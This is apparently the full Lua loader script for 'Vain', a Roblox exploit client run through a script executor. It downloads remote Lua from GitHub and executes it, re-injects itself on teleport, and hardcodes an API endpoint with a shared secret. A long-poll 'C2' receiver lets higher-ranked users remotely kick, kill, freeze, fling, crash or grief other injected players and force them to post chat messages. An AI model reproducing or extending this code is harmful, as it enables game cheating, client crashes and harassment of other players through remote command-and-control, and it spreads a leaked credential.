repeat task.wait() until game:IsLoaded()
if shared.vain then shared.vain:Uninject() end

local vain
local loadstring = function(...)
	local res, err = loadstring(...)
	if err and vain then
		vain:CreateNotification('Vain', 'Failed to load : '..err, 30, 'alert')
	end
	return res
end
local queue_on_teleport = queue_on_teleport or function() end
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local cloneref = cloneref or function(obj)
	return obj
end
local playersService = cloneref(game:GetService('Players'))
local httpService = cloneref(game:GetService('HttpService'))

local delfile = delfile or function(file) writefile(file, '') end
-- GitHub raw serves error bodies as short plain text ("400: Invalid request",
-- "404: Not Found", "429: ..."). Caching those as code is what produced the
-- [string "entitylibrary"]:2: ... got '400' error, so never write a "NNN: ..." body.
local function isHttpError(res)
	return type(res) ~= 'string' or res == '' or res:match('^%s*%d%d%d:%s') ~= nil
end
local function downloadFile(path, func)
	-- self-heal a previously-cached error body
	if isfile(path) and path:find('%.lua') then
		local cached = readfile(path)
		if cached:match('^%s*%d%d%d:%s') or cached:match('^%-%-This watermark[^\n]*\n%s*%d%d%d:%s') then
			delfile(path)
		end
	end
	if not isfile(path) then
		-- surface progress on the Vain loading screen (built lazily in init.lua)
		if getgenv and getgenv().vainLoading then getgenv().vainLoading.status('Downloading '..path) end
		-- readfile throws on a missing commit.txt; guard it and fall back to main.
		local ok, raw = pcall(readfile, 'vain/profiles/commit.txt')
		local commit = (ok and type(raw) == 'string' and raw or ''):match('^%s*(.-)%s*$')
		if commit == '' then commit = 'main' end
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/VainV6/Vain/'..commit..'/'..select(1, path:gsub('vain/', '')), true)
		end)
		if not suc or isHttpError(res) then
			error('Vain failed to download '..path..' (ref '..commit..'): '..tostring(res))
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vain updates.\n'..res
		end
		writefile(path, res)
		if getgenv and getgenv().vainLoading then getgenv().vainLoading.bump() end
	end
	return (func or readfile)(path)
end

-- Build a map of line number → module display name for a file's content.
-- A module only OWNS the lines inside its own `run(function() … end)` block, so
-- shared helpers, section-separator comments and the next module's preamble are
-- left unowned and can never be mis-tagged as that module being updated.
local function buildLineModuleMap(content)
	local allLines = {}
	for line in content:gmatch('([^\n]*)\n?') do
		table.insert(allLines, line)
	end

	-- find every CreateModule, its display Name, and the bounds of its block
	local moduleStarts = {}
	local lineModules = {}
	for i, line in ipairs(allLines) do
		if line:find(':CreateModule%(') then
			local name
			for j = i, math.min(i + 8, #allLines) do
				name = allLines[j]:match("Name%s*=%s*'([^']+)'")
				    or allLines[j]:match('Name%s*=%s*"([^"]+)"')
				if name then break end
			end
			if name then
				-- block start: nearest preceding top-level `run(function()` wrapper
				-- (col 0). Every module in these files is wrapped in one; fall back to
				-- the CreateModule line itself if none is found nearby.
				local startLine = i
				for k = i, math.max(i - 60, 1), -1 do
					if allLines[k]:match('^run%(function') then
						startLine = k
						break
					end
				end
				-- block end: first top-level `end)` at/after the CreateModule line
				local endLine = #allLines
				for k = i, #allLines do
					if allLines[k]:match('^end%)') then
						endLine = k
						break
					end
				end
				table.insert(moduleStarts, { line = i, name = name })
				for ln = startLine, endLine do
					-- first writer wins so nested blocks don't steal lines
					if lineModules[ln] == nil then lineModules[ln] = name end
				end
			end
		end
	end

	return lineModules, moduleStarts
end

-- Collect the NEW-FILE line numbers that were actually ADDED in a patch (i.e. the
-- '+' lines, never the unchanged context lines a hunk carries). Tracking the real
-- line counter is what makes UPD precise -- context lines used to falsely tag the
-- neighbouring module.
local function parseAddedLines(patch)
	local added = {}
	local newLine = nil
	for line in patch:gmatch('([^\n]*)\n?') do
		local hdr = line:match('^@@ %-%d+,?%d* %+(%d+)')
		if hdr then
			newLine = tonumber(hdr)
		elseif newLine then
			local c = line:sub(1, 1)
			if c == '+' then
				if line:sub(1, 3) ~= '+++' then
					table.insert(added, newLine)
					newLine = newLine + 1
				end
			elseif c == '-' then
				-- removed line: does not advance the new-file counter
			elseif c ~= '\\' then
				-- context line: advances the counter but is NOT a change
				newLine = newLine + 1
			end
		end
	end
	return added
end

-- Detect NEW modules: CreateModule lines that are pure additions in the patch
local function detectNewModulesFromPatch(patch)
	local newMods = {}
	local patchLines = {}
	for line in patch:gmatch('[^\n]+') do
		table.insert(patchLines, line)
	end
	for i, line in ipairs(patchLines) do
		if line:sub(1, 1) == '+' and line:find(':CreateModule%(') then
			for j = i, math.min(i + 8, #patchLines) do
				local name = patchLines[j]:match("Name%s*=%s*'([^']+)'")
				          or patchLines[j]:match('Name%s*=%s*"([^"]+)"')
				if name then
					newMods[name] = true
					break
				end
			end
		end
	end
	return newMods
end

local function applyBadges(changed)
	if not vain then return end
	for name, tag in changed do
		local mod = vain.Modules[name]
		if mod then
			local t = tag
			mod.ExtraText = function() return t end
			if mod.Object then
				mod.Object.RichText = true
				local tagColor = tag == 'NEW' and '#00DD55' or '#FF8800'
				mod.Object.Text = mod.Object.Text.." <font color='"..tagColor.."' size='10'><b>"..tag.."</b></font>"
			end
		end
	end
end

-- Manual module badges: tag the modules listed in vain.ModuleBadges with a
-- NEW / UPD label next to their name. No GitHub auto-diff -- the list is set by
-- hand per release and shows on every inject until the next release edits it.
local function detectUpdates()
	pcall(function()
		if not vain or type(vain.ModuleBadges) ~= 'table' then return end
		local changed = {}
		for name, tag in pairs(vain.ModuleBadges) do
			if tag == 'NEW' or tag == 'UPD' then changed[name] = tag end
		end
		if not next(changed) then return end
		applyBadges(changed)
	end)
end

-- ── Vain API ────────────────────────────────────────────────────────────────
local API_URL    = 'https://vain-api.baconcrafft.workers.dev'
local API_SECRET = 'bf5d6650662b48a72a979e7cea9b97edd5170401dd99a50b'

local vainTier     = 0
local vainTierName = 'Free'
local commandToken = nil  -- our per-user command token, fetched from /check

local httpRequest = (syn and syn.request) or (http and http.request) or request

local function apiRequest(method, path, body)
	if not httpRequest then return nil end
	local ok, res = pcall(httpRequest, {
		Url     = API_URL .. path,
		Method  = method,
		Headers = { ['x-vain-secret'] = API_SECRET, ['Content-Type'] = 'application/json' },
		Body    = body,
	})
	return ok and res and res.Body or nil
end

local function checkWhitelist()
	local lp = playersService.LocalPlayer
	if not lp then return end
	local username = lp.Name
	local userId   = tostring(lp.UserId)
	local body = apiRequest('GET', '/check?username='..username..'&userid='..userId)
	if body then
		local ok, data = pcall(httpService.JSONDecode, httpService, body)
		if ok and data then
			if data.blacklisted then
				lp:Kick('[Vain] You are blacklisted.')
				return
			end
			vainTier     = data.tier or 0
			vainTierName = data.tier_name or 'Free'
			-- our own per-user command token (auto-provisioned server-side).
			-- Shared with the universal sender via getgenv so ;<cmd> works with no setup.
			if data.command_token and data.command_token ~= '' then
				commandToken = data.command_token
				getgenv().vainCommandToken = commandToken
			end
		end
	end
	if vain then
		vain.Tier     = vainTier
		vain.TierName = vainTierName
	end
end

-- Tier cache for OTHER injected Vain users. The games file calls
-- getgenv().getAccountTier(player) to stop lower-tier users from targeting
-- higher-tier ones. We resolve every current player's tier in one /tiers
-- request and cache it by lowercase username. Unknown players default to 0 (Free).
local tierCache = {}

local function getAccountTierFor(player)
	if not player then return 0 end
	local lp = playersService.LocalPlayer
	if player == lp then return vainTier end
	return tierCache[tostring(player.Name):lower()] or 0
end
getgenv().getAccountTier = getAccountTierFor

local function startTierSync()
	task.spawn(function()
		while vain and vain.Loaded do
			local names = {}
			for _, plr in ipairs(playersService:GetPlayers()) do
				table.insert(names, plr.Name)
			end
			if #names > 0 then
				local body = apiRequest('POST', '/tiers', httpService:JSONEncode({usernames = names}))
				if body then
					local ok, data = pcall(httpService.JSONDecode, httpService, body)
					if ok and data and data.tiers then
						-- keep the local player authoritative from checkWhitelist
						tierCache = data.tiers
						tierCache[tostring(playersService.LocalPlayer.Name):lower()] = vainTier
					end
				end
			end
			task.wait(15)
		end
	end)
end

-- ── Command receiver (executes ;<command> <target> relayed via the API) ──────
-- A command only reaches you if the API accepted it, and the API only accepts a
-- command whose sender is ranked ABOVE you, so anything we receive here is
-- already authorised -- we just run it locally.
-- Tracks WASD-inversion state for the ;invert command so a second ;invert
-- restores normal movement. The ControlModule lives in PlayerScripts and
-- survives respawns, so a single hook persists for the whole session.
local invertState = { active = false, orig = nil }

local function executeCommand(command, args)
	local lp   = playersService.LocalPlayer
	local char = lp.Character
	local hrp  = char and char:FindFirstChild('HumanoidRootPart')
	local hum  = char and char:FindFirstChildOfClass('Humanoid')

	if command == 'kick' then
		-- optional custom message: ;kick <user> <msg>
		local msg = (type(args) == 'string' and args ~= '') and args or 'You have been kicked.'
		lp:Kick('[Vain] ' .. msg)
	elseif command == 'rejoin' then
		pcall(function()
			game:GetService('TeleportService'):Teleport(game.PlaceId, lp)
		end)
	elseif command == 'toggle' then
		-- args = module name; flip it via vain.Modules (the canonical name->module
		-- map). Case-insensitive so ";toggle me fly" matches "Fly".
		if vain and (vain.Modules or vain.Legit) and type(args) == 'string' and args ~= '' then
			pcall(function()
				-- resolve the module case-insensitively across BOTH the main module map
				-- and the Legit map (some modules live only in vain.Legit.Modules).
				local want = args:lower()
				local mod = vain.Modules and vain.Modules[args]
				if not mod and vain.Modules then
					for name, m in vain.Modules do
						if tostring(name):lower() == want then mod = m break end
					end
				end
				if not mod and vain.Legit and vain.Legit.Modules then
					for name, m in vain.Legit.Modules do
						if tostring(name):lower() == want then mod = m break end
					end
				end
				if mod and mod.Toggle then
					-- Run the toggle on a fresh thread with the elevated identity that
					-- modules expect (same context a keybind/menu click gives them);
					-- otherwise the module's Function runs under our restricted command
					-- thread and its effect silently no-ops. We WAIT for the flip so the
					-- notification reports the real resulting state.
					local done, newState = false, nil
					task.spawn(function()
						pcall(function()
							if setthreadidentity then setthreadidentity(8) end
						end)
						pcall(function() mod:Toggle() end)
						newState = mod.Enabled
						done = true
					end)
					-- give the toggle a moment to run, then report truthfully
					task.spawn(function()
						local t0 = tick()
						repeat task.wait() until done or tick() - t0 > 2
						if vain.CreateNotification then
							local label = newState and 'Enabled' or 'Disabled'
							vain:CreateNotification('Commands', label .. ' ' .. tostring(args), 4)
						end
					end)
				elseif vain.CreateNotification then
					vain:CreateNotification('Commands', 'No module named "' .. tostring(args) .. '"', 5, 'alert')
				end
			end)
		end
	elseif command == 'chat' then
		-- make the target say args in chat
		if type(args) == 'string' and args ~= '' then
			task.spawn(function()
				local tcs = game:GetService('TextChatService')
				local rs  = game:GetService('ReplicatedStorage')
				pcall(function()
					if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
						local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
						         or tcs.ChatInputBarConfiguration.TargetTextChannel
						if ch then ch:SendAsync(args) end
					else
						rs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(args, 'All')
					end
				end)
			end)
		end
	elseif command == 'kill' then
		if hum then hum.Health = 0 end
	elseif command == 'freeze' then
		task.spawn(function()
			local end_t = tick() + 30
			while tick() < end_t and hrp do
				hrp.Velocity    = Vector3.zero
				hrp.RotVelocity = Vector3.zero
				hrp.Anchored    = true
				task.wait(0.1)
			end
			if hrp then hrp.Anchored = false end
		end)
	elseif command == 'crash' then
		task.spawn(function() while true do end end)
	elseif command == 'expose' then
		-- make the target publicly say "I love call centers" in chat
		task.spawn(function()
			local tcs = game:GetService('TextChatService')
			local rs  = game:GetService('ReplicatedStorage')
			local msg = 'I love call centers'
			pcall(function()
				if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
					local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
					         or tcs.ChatInputBarConfiguration.TargetTextChannel
					if ch then ch:SendAsync(msg) end
				else
					rs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
				end
			end)
		end)
	elseif command == 'fling' then
		if hrp then hrp.Velocity = Vector3.new(math.random(-500,500), 1000, math.random(-500,500)) end
	elseif command == 'spin' then
		task.spawn(function()
			local end_t = tick() + 30
			while tick() < end_t and hrp do
				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
				task.wait()
			end
		end)
	elseif command == 'loopkill' then
		task.spawn(function()
			local end_t = tick() + 60
			while tick() < end_t do
				local h = lp.Character and lp.Character:FindFirstChildOfClass('Humanoid')
				if h then h.Health = 0 end
				task.wait(3)
			end
		end)
	elseif command == 'annoy' then
		task.spawn(function()
			local end_t = tick() + 30
			while tick() < end_t do
				if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(math.random(-3,3), 5, math.random(-3,3)) end
				task.wait(0.5)
			end
		end)
	elseif command == 'grief' then
		task.spawn(function()
			local end_t = tick() + 30
			while tick() < end_t do
				lp:LoadCharacter()
				task.wait(4)
			end
		end)
	elseif command == 'notify' then
		if vain then vain:CreateNotification('Vain', args or 'Message from admin', 10, 'alert') end
	elseif command == 'spam' then
		-- make the target repeatedly say "helloimusinginhaler" in chat
		task.spawn(function()
			local tcs = game:GetService('TextChatService')
			local rs  = game:GetService('ReplicatedStorage')
			local msg = 'helloimusinginhaler'
			local end_t = tick() + 30
			while tick() < end_t do
				pcall(function()
					if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
						local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
						         or tcs.ChatInputBarConfiguration.TargetTextChannel
						if ch then ch:SendAsync(msg) end
					else
						rs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
					end
				end)
				task.wait(1)
			end
		end)
	elseif command == 'invert' then
		-- Toggle WASD (movement) inversion by negating the ControlModule's move
		-- vector. W<->S and A<->D swap; analog stick / mobile thumbstick invert too.
		-- A second ;invert restores the original method. All input paths funnel
		-- through GetMoveVector, so this is the single reliable hook point.
		pcall(function()
			local ps = lp:FindFirstChild('PlayerScripts')
			local pm = ps and ps:FindFirstChild('PlayerModule')
			if not pm then
				if vain then vain:CreateNotification('Commands', 'Could not find movement controller', 5, 'alert') end
				return
			end
			local control = require(pm):GetControls()
			if not control or not control.GetMoveVector then return end

			if invertState.active and invertState.orig then
				-- restore normal movement
				control.GetMoveVector = invertState.orig
				invertState.active = false
				invertState.orig   = nil
				if vain then vain:CreateNotification('Commands', 'Movement restored', 4) end
			else
				-- capture the real method once, then wrap it to return the negated vector
				local orig = invertState.orig or control.GetMoveVector
				invertState.orig = orig
				control.GetMoveVector = function(self, ...)
					return -orig(self, ...)
				end
				invertState.active = true
				if vain then vain:CreateNotification('Commands', 'Movement inverted', 4, 'alert') end
			end
		end)
	end

	-- Game-specific commands registered by a per-game script (e.g. BedWars
	-- ;scramblekeys). No-op in games that never registered a handler.
	local gameCmd = getgenv().vainGameCommands and getgenv().vainGameCommands[command]
	if gameCmd then pcall(gameCmd, args) end
end

-- Expose the local executor so the in-game chat receiver (universal.lua) can run
-- an authorised ;command typed by a NON-injected user directly, without the API
-- relay. Authorisation for that path is enforced on the receiver side there.
getgenv().vainExecuteCommand = function(command, args)
	if type(command) ~= 'string' then return end
	pcall(executeCommand, command:lower(), args)
end

-- Long-poll: the server holds the connection open up to 25s and responds the
-- instant a command is queued. We reconnect immediately after each response so
-- latency is ~500ms worst case. We identify ourselves by our per-user token
-- (not a spoofable username), so nobody else can intercept our commands.
local function startC2LongPoll()
	task.spawn(function()
		while vain and vain.Loaded do
			if not commandToken then
				-- token not fetched yet (or we're Free / not whitelisted) — wait
				task.wait(3)
			else
				local body = apiRequest('GET', '/commands/poll?token=' .. commandToken)
				if body then
					local ok, data = pcall(httpService.JSONDecode, httpService, body)
					if ok and data and data.command then
						pcall(executeCommand, data.command, data.args)
					end
				else
					-- request failed (no httpRequest or network error) — back off
					task.wait(5)
				end
			end
		end
	end)
end
-- Presence heartbeat: tell the API we're injected in this server (by JobId) and
-- learn who else is. getgenv().vainInjectedUsers becomes an array of
-- { username = , tier = } for the OTHER Vain users currently injected here, which
-- the Vain Detector module reads.
getgenv().vainInjectedUsers = {}
local function startPresence()
	task.spawn(function()
		while vain and vain.Loaded do
			local lp = playersService.LocalPlayer
			local body = apiRequest('POST', '/presence', httpService:JSONEncode({
				username = lp.Name,
				userid   = tostring(lp.UserId),
				jobId    = game.JobId,
			}))
			if body then
				local ok, data = pcall(httpService.JSONDecode, httpService, body)
				if ok and data and type(data.users) == 'table' then
					getgenv().vainInjectedUsers = data.users
				end
			end
			task.wait(15)
		end
	end)
end
-- ── End Vain API ─────────────────────────────────────────────────────────────

local function finishLoading()
	vain.Init = nil

	-- If the Vain loading screen was shown (a fresh install / update), everything
	-- is now loaded: fill + fade it out, then show the What's New panel. (When no
	-- loading screen ran, new.lua shows What's New on its own.)
	local loading = getgenv and getgenv().vainLoading
	if loading and loading.isActive() then
		loading.finish(function()
			-- one-time (no force): only shows once per new version (patchseen.txt)
			if getgenv().vainShowPatchNotes then getgenv().vainShowPatchNotes(false) end
		end)
	end

	-- Load saved settings and start the local save loop FIRST. These are fast,
	-- local-only operations, so the GUI becomes usable immediately. Wrapped in
	-- pcall so a single bad option / GUI element can't abort the rest of loading
	-- (which previously left half the modules unregistered / unshown).
	local okLoad, loadErr = pcall(function() vain:Load() end)
	if not okLoad then
		pcall(function() vain:CreateNotification('Vain', 'Settings load error (some may not apply): '..tostring(loadErr), 8, 'warning') end)
	end
	task.spawn(function()
		repeat
			vain:Save()
			task.wait(10)
		until not vain.Loaded
	end)
	startTierSync()
	startC2LongPoll()
	startPresence()

	-- The whitelist check, update detection, and the welcome notification each
	-- make blocking HTTP round-trips. Running them synchronously here froze the
	-- screen for seconds on inject, so defer them to a background thread; the
	-- GUI is already interactive by the time these finish.
	task.spawn(function()
		checkWhitelist()
		detectUpdates()
		if not shared.vainreload then
			if not vain.Categories then return end
			if vain.Categories.Main.Options['GUI bind indicator'].Enabled then
				vain:CreateNotification(
					'[VAIN] Finished Loading [Tier '..tostring(vainTier)..']',
					'welcome '..playersService.LocalPlayer.Name..', press '..table.concat(vain.Keybind, ' + '):upper()..' to open GUI',
					5
				)
			end
		end
	end)

	local teleportedServers
	vain:Clean(playersService.LocalPlayer.OnTeleport:Connect(function(state)
		if (not teleportedServers) and (not shared.VainIndependent) then
			teleportedServers = true
			local teleportScript = [[
				loadstring(game:HttpGet('https://raw.githubusercontent.com/VainV6/Vain/main/init.lua', true), 'init')()
			]]
			if shared.VainDeveloper then
				teleportScript = 'shared.VainDeveloper = true\n'..teleportScript
			end
			if shared.VainCustomProfile then
				teleportScript = 'shared.VainCustomProfile = "'..shared.VainCustomProfile..'"\n'..teleportScript
			end
			queue_on_teleport(teleportScript)
		end
	end))
end

if not isfile('vain/profiles/gui.txt') then
	writefile('vain/profiles/gui.txt', 'new')
end
local gui = 'new'

if not isfolder('vain/assets/'..gui) then
	makefolder('vain/assets/'..gui)
end
local guiLoader = loadstring(downloadFile('vain/guis/'..gui..'.lua'), 'gui')
vain = guiLoader and guiLoader()
shared.vain = vain

if not shared.VainIndependent then
	local universalLoader = loadstring(downloadFile('vain/games/universal.lua'), 'universal')
	if universalLoader then universalLoader() end
	if isfile('vain/games/'..game.PlaceId..'.lua') then
		local gameLoader = loadstring(readfile('vain/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))
		if gameLoader then gameLoader() end
	else
		-- Download the game file if this place has one. This must NOT be gated on
		-- shared.VainDeveloper: doing so meant a dev/test inject with a wiped cache
		-- never loaded the game modules at all (only universal), so most BedWars
		-- modules silently vanished. Probe first so a 404 place is skipped quietly.
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/VainV6/Vain/'..readfile('vain/profiles/commit.txt')..'/games/'..game.PlaceId..'.lua', true)
		end)
		if suc and res ~= '404: Not Found' and not isHttpError(res) then
			local gameLoader = loadstring(downloadFile('vain/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))
			if gameLoader then gameLoader() end
		end
	end
	finishLoading()
else
	vain.Init = finishLoading
	return vain
end
